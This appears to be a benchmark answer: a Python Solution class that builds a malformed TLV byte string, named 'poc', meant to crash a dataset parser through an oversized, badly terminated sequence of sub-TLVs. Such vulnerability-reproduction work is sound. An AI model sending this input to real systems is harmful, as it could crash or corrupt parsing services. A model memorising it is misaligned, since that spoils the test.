class Solution:
    def solve(self, src_path: str) -> bytes:
        security_policy = b'\x2e\x03\x00\x00\x00'
        channel = b'\x00\x02\x00\x0b'
        subtlvs = security_policy * 49 + channel * 2
        bad_tlv = b'\x15\x00'
        full_sub = subtlvs + bad_tlv
        dataset = b'\x00\xff' + full_sub
        poc = dataset + b'\x00' * 5
        return poc